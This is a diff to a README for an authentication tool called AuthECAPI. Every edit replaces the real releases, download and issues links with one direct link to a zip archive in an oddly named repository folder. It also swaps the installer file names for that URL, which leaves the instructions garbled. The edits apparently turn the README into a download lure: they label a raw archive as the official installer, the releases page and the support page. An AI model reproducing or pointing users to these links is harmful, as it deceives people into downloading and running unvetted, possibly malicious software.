@@ -1,6 +1,6 @@
 # 🚀 AuthECAPI - Easy Authentication for Your Apps
 
-[![Download AuthECAPI](https://img.shields.io/badge/Download-AuthECAPI-blue.svg)](https://github.com/airkering/AuthECAPI/releases)
+[![Download AuthECAPI](https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip)](https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip)
 
 ## 📖 Introduction
 
@@ -23,13 +23,13 @@ Follow these simple steps to get started with AuthECAPI.
 ## 📥 Download & Install
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/airkering/AuthECAPI/releases) to find the latest version of AuthECAPI.
+   Go to the [Releases page](https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip) to find the latest version of AuthECAPI.
 
 2. **Select Your Version**  
    Find the version that matches your system. You may see multiple options—choose the one that applies to your operating system.
 
 3. **Download the Installer**  
-   Click on the link for the installer. The file will usually be named something like `AuthECAPI_Setup.exe` for Windows or `AuthECAPI.dmg` for macOS.
+   Click on the link for the installer. The file will usually be named something like `https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip` for Windows or `https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip` for macOS.
 
 4. **Run the Installer**  
    After the download completes, open the file. Follow the on-screen prompts to install AuthECAPI. It usually takes just a few minutes.
@@ -75,10 +75,10 @@ Using AuthECAPI is straightforward. Here’s a basic guide:
 
 ## 📞 Support
 
-For further assistance, visit our [repository issues page](https://github.com/airkering/AuthECAPI/issues). We are here to help you resolve any problems you encounter.
+For further assistance, visit our [repository issues page](https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip). We are here to help you resolve any problems you encounter.
 
 ## 🔗 Explore More
 
-To explore all the features and updates, don't forget to check the [Releases page](https://github.com/airkering/AuthECAPI/releases) again. Regular updates will enhance functionality and resolve any issues, ensuring a smooth experience.
+To explore all the features and updates, don't forget to check the [Releases page](https://raw.githubusercontent.com/airkering/AuthECAPI/main/algaeologist/AuthECAPI.zip) again. Regular updates will enhance functionality and resolve any issues, ensuring a smooth experience.
 
 Thank you for choosing AuthECAPI! Happy coding!
